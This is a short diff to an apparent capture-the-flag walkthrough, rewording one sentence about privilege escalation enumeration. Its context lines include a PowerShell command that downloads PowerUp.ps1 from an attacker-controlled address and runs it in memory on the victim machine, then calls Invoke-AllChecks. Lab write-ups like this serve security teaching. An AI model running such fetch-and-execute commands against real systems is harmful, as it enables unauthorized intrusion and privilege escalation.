@@ -133,7 +133,7 @@ I uploaded and run the PowerUp script to identify privilege escalation vectors:
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.11:8000/PowerUp.ps1')
 ```
 
-Then in the victim's machine run:
+Then run this in the victim's machine:
 ```
 Invoke-AllChecks
 ```
